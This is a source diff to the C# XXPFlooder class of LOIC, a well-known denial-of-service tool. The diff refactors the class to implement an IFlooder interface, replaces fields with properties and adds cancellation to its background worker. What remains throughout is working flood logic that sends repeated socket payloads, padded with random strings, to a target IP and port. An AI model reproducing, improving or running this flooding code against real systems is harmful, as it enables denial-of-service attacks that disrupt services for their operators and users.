@@ -10,11 +10,13 @@ using System.Net.Sockets;
 
 namespace LOIC
 {
-	public class XXPFlooder
+	public class XXPFlooder : IFlooder
 	{
-		public bool IsFlooding;
-		public int FloodCount;
-		public int Delay;
+		public bool IsFlooding { get; set; }
+		public int Delay       { get; set; }
+		public int FloodCount  { get; set; }
+
+		private BackgroundWorker bw;
 
 		private readonly string IP;
 		private readonly int Port;
@@ -35,21 +37,23 @@ namespace LOIC
 		}
 		public void Start()
 		{
-			IsFlooding = true;
-			BackgroundWorker bw = new BackgroundWorker();
-			bw.DoWork += bw_DoWork;
-			bw.RunWorkerAsync();
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
 		}
 		public void Stop()
 		{
-			IsFlooding = false;
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
 		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
 					if(Protocol == 1)
 					{
@@ -63,7 +67,7 @@ namespace LOIC
 							socket.Blocking = Resp;
 							try
 							{
-								while (IsFlooding)
+								while (this.IsFlooding)
 								{
 									FloodCount++;
 									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
@@ -82,7 +86,7 @@ namespace LOIC
 							socket.Blocking = Resp;
 							try
 							{
-								while (IsFlooding)
+								while (this.IsFlooding)
 								{
 									FloodCount++;
 									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
